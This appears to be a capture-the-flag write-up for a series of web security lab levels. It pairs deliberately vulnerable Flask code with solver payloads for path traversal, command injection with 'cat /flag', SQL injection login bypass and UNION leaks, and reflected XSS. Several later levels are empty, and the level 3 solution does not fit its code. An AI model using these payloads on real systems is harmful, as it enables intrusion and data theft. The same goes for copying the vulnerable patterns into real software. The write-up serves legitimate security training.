<div align="center">
    <h1> Web Security</h1> 
</div>

### Level 1 - Exploit a path traversal vulnerability

```python
===== Welcome to Web Security! =====
In this series of challenges, you will be working to break web applications!
Read the code for the level, find the security vulnerability, and develop an exploit to get the flag.
Note that the web application is running Python and using the Flask library, so see the Flask documentation as necessary.

Here's the source code of this level:
def level1():
    path = request.args.get("path")
    assert path, "Missing `path` argument"
    return (pathlib.Path(app.root_path) / path).read_text()
```

```bash
$ curl http://challenge.localhost/?path=/flag
```

### Level 2 - Exploit a command injection vulnerability

```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin")
```

```bash
$ curl 'http://challenge.localhost?timezone=UTC;cat%20/flag;'
```

### Level 3 - Exploit an authentication bypass vulnerability

```python
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))-

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))

    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```



```bash
$ curl http://challenge.localhost/?user=1-
```

### Level 4 - Exploit a structured query language injection vulnerability to login

```python
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

```python
import requests 

form = { 
    "username" : 'flag" --', 
    "password" : "w3th4nds", 
} 

response = requests.post("http://challenge.localhost/", data=form) 

print(response.text.strip()) 
```

### Level 5 - Exploit a structured query language injection vulnerability to leak data

```python
def level5():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
```

```python
import requests 

params = {"query" : '" UNION SELECT password from USERS --'} 

response = requests.post("http://challenge.localhost/", params=params) 

print(response.text.strip())
```

### Level 6 - Exploit a structured query language injection vulnerability with an unknown database structure

```python
def level6():
    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
```

```python
import requests 

params = {"query": '" UNION SELECT tbl_name from sqlite_master --'} 

response = requests.post("http://challenge.localhost/", params=params) 

t_name = response.text.strip()

params = {"query": f'" UNION SELECT password from {t_name} --' }

response = requests.post("http://challenge.localhost/", params=params) 

print(response.text.strip())
```

### Level 7 - Exploit a structured query language injection vulnerability to blindly leak data

```python
def level7():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone()
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```

```python
import requests 

data = { 
    "username" : "flag", 
    "password" : '" UNION SELECT password, * FROM USERS --'
} 

response = requests.post("http://challenge.localhost/", data=data) 

idx = response.text.strip().index('pwn')
print(response.text[idx:-2])
```

### Level 8 - Exploit a cross site scripting vulnerability

```python
def level8():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```

```python
import requests 
import urllib.parse

# Craft a URL where the hostname matches challenge_host
url = f"http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=<script>alert(1)</script>"

response = requests.get(url)

print(response.text)
```

### Level 9 - Exploit a cross site scripting vulnerability with more complicated context

```python
def level9():
    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(f"<textarea>{echo}</textarea>")

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(url)
            try:
                WebDriverWait(browser, 1).until(EC.alert_is_present())
            except TimeoutException:
                return "Failed to alert\n"
            else:
                return f"{flag}\n"

    return "Not Found\n", 404
```

```python
import requests 
import urllib.parse

# Craft a URL where the hostname matches challenge_host
url = f"http://challenge.localhost/visit?url=http://challenge.localhost/echo?echo=</textarea><script>alert(1)</script><textarea>"

response = requests.get(url)

print(response.text)
```

### Level 10 - Exploit a cross site scripting vulnerability to cause a user action

```python
def level10():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password, ? as leak'),
               (flag, False))

    if request.path == "/login":
        if request.method == "POST":
            username = request.form.get("username")
            password = request.form.get("password")
            assert username, "Missing `username` form"
            assert password, "Missing `password` form"

            user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
            assert user, "Invalid `username` or `password`"

            session["user"] = int(user["rowid"])
            return redirect(request.path)

        return form(["username", "password"])

    if request.path == "/leak":
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Not logged in"
        db.execute(f"UPDATE users SET leak = TRUE WHERE rowid = ?", (user_id,))
        return "Leaked\n"

    if request.path == "/info":
        assert "user" in request.args, "Missing `user` argument"
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        assert user, "Invalid `user`"
        info = [user["username"]]
        if user["leak"]:
            info.append(user["password"])
        return " ".join(info) + "\n"

    if request.path == "/visit":
        url = request.args.get("url")
        assert url, "Missing `url` argument"

        url_arg_parsed = urllib.parse.urlparse(url)
        assert url_arg_parsed.hostname == challenge_host, f"Invalid `url`, hostname should be `{challenge_host}`"

        with run_browser() as browser:
            browser.get(f"http://{challenge_host}/login")

            user_form = {
                "username": "flag",
                "password": flag,
            }
            for name, value in user_form.items():
                field = browser.find_element(By.NAME, name)
                field.send_keys(value)

            submit_field = browser.find_element(By.ID, "submit")
            submit_field.submit()
            WebDriverWait(browser, 10).until(EC.staleness_of(submit_field))

            browser.get(url)
            time.sleep(1)

        return "Visited\n"

    if request.path == "/echo":
        echo = request.args.get("echo")
        assert echo, "Missing `echo` argument"
        return html(echo)

    return "Not Found\n", 404
```
```python

```

### Level 11 - 

```python

```
```python

```

### Level 12 - 

```python

```
```python

```

### Level 13 - 

```python

```
```python

```

### Level 14 - 

```python

```
```python

```

### Level 15 - Exploit a (memory corruption) stack injection vulnerability

```python
def level15():
    if "libgreet" not in globals():
        global libgreet
        shared_library_file = tempfile.NamedTemporaryFile("x", suffix=".so")
        gcc_args = ["/usr/bin/gcc", "-x", "c", "-shared", "-fPIC", "-fno-stack-protector", "-o", shared_library_file.name, "-"]
        subprocess.run(gcc_args, input=r"""
        #include <unistd.h>
        #include <fcntl.h>
        #include <stdio.h>
        #include <string.h>

        void __attribute__ ((constructor)) disable_buffering(void) {
          setvbuf(stdout, NULL, _IONBF, 0);
        }

        void win(void)
        {
          char flag[256] = { 0 };
          int flag_fd;

          puts("You win! Here is your flag:");

          flag_fd = open("/flag", 0);
          read(flag_fd, flag, sizeof(flag));
          puts(flag);
        }

        void * win_address(void)
        {
          return win;
        }

        void greet(char *name, size_t length)
        {
          char buffer[256] = { 0 };

          memcpy(buffer, "Hello, ", 7);
          memcpy(buffer + 7, name, length);
          memcpy(buffer + 7 + length, "!", 1);

          puts(buffer);
        }
        """.encode())
        libgreet = ctypes.CDLL(shared_library_file.name)
        libgreet.win_address.restype = ctypes.c_void_p

    if request.path == "/win_address":
        return f"{hex(libgreet.win_address())}\n"

    if request.path == "/greet":
        name = request.args.get("name")
        assert name, "Missing `name` argument"

        def stream_greet():
            r, w = os.pipe()
            pid = os.fork()

            if pid == 0:
                os.close(r)
                os.dup2(w, 1)
                name_buffer = ctypes.create_string_buffer(name.encode("latin"))
                libgreet.greet(name_buffer, len(name))
                os._exit(0)

            os.close(w)
            while True:
                data = os.read(r, 256)
                if not data:
                    break
                yield data
            os.wait()

        return stream_greet()

    return "Not Found\n", 404
```
```python

```
